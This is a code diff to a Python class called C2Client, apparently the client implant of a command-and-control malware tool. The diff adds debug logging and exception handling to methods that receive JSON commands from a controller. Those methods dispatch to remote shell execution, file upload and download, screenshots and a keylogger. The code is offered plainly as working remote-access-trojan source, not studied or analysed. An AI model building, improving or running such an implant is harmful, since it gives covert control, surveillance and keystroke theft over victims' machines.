@@ -95,8 +95,17 @@ class C2Client:
         """Receive JSON data"""
         try:
             data = self.socket.recv(4096).decode()
-            return json.loads(data)
-        except:
+            if not data:
+                self.debug_log("[RECV] Empty data received")
+                return None
+            result = json.loads(data)
+            self.debug_log("[RECV] Received: {0}".format(str(result)[:100]))
+            return result
+        except json.JSONDecodeError as e:
+            self.debug_log("[RECV] JSON decode error: {0}, data was: {1}".format(str(e), str(data)[:100]))
+            return None
+        except Exception as e:
+            self.debug_log("[RECV] Error: {0}".format(str(e)))
             return None
     
     def get_system_info(self):
@@ -204,32 +213,43 @@ class C2Client:
     
     def handle_command(self, cmd_data):
         """Handle incoming command"""
-        cmd_type = cmd_data.get('cmd')
-        
-        if cmd_type == 'exec':
-            output = self.cmd_execute(cmd_data.get('data', ''))
-            return {{'type': 'exec', 'output': output}}
-        
-        elif cmd_type == 'download':
-            return self.cmd_download(cmd_data.get('file'))
-        
-        elif cmd_type == 'upload':
-            return self.cmd_upload(cmd_data.get('file'), cmd_data.get('data'))
-        
-        elif cmd_type == 'screenshot':
-            return self.cmd_screenshot()
-        
-        elif cmd_type == 'keylog':
-            return self.cmd_keylogger(cmd_data.get('duration', 60))
-        
-        elif cmd_type == 'info':
-            return self.get_system_info()
-        
-        elif cmd_type == 'exit':
-            self.running = False
-            return {{'type': 'exit'}}
-        
-        return {{'type': 'error', 'msg': 'Unknown command'}}
+        try:
+            if not isinstance(cmd_data, dict):
+                self.debug_log("[CMD] Error: cmd_data is not a dict, it's a {0}: {1}".format(type(cmd_data), str(cmd_data)[:100]))
+                return {{'type': 'error', 'msg': 'Invalid command format'}}
+            
+            cmd_type = cmd_data.get('cmd')
+            
+            if cmd_type == 'exec':
+                output = self.cmd_execute(cmd_data.get('data', ''))
+                return {{'type': 'exec', 'output': output}}
+            
+            elif cmd_type == 'download':
+                return self.cmd_download(cmd_data.get('file'))
+            
+            elif cmd_type == 'upload':
+                return self.cmd_upload(cmd_data.get('file'), cmd_data.get('data'))
+            
+            elif cmd_type == 'screenshot':
+                return self.cmd_screenshot()
+            
+            elif cmd_type == 'keylog':
+                return self.cmd_keylogger(cmd_data.get('duration', 60))
+            
+            elif cmd_type == 'info':
+                return self.get_system_info()
+            
+            elif cmd_type == 'exit':
+                self.running = False
+                return {{'type': 'exit'}}
+            
+            self.debug_log("[CMD] Unknown command type: {0}".format(cmd_type))
+            return {{'type': 'error', 'msg': 'Unknown command'}}
+        except Exception as e:
+            self.debug_log("[CMD] Exception in handle_command: {0}".format(str(e)))
+            import traceback
+            self.debug_log("[CMD] Traceback: {0}".format(traceback.format_exc()))
+            return {{'type': 'error', 'msg': str(e)}}
     
     def run(self):
         """Main loop with retry logic"""
